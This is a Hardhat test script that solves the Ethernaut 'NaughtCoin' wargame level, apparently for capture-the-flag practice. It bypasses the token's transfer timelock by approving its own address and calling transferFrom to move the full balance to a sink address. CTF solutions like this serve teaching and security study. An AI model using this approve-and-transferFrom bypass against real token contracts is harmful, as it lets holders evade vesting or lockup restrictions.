import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`NaughtCoin`);
  const challengeAddress = await createChallenge(
    `0x096bb5e93a204BfD701502EB6EF266a950217218`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  const eoaAddress = await eoa.getAddress()
  const balance = await challenge.balanceOf(eoaAddress)
  console.log(`balance`, balance.toString())

  tx = await challenge.approve(eoaAddress, balance)
  await tx.wait()
  const SINK = `0x0000000000000000000000000000000000000001`
  tx = await challenge.transferFrom(eoaAddress, SINK, balance)
  await tx.wait()
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
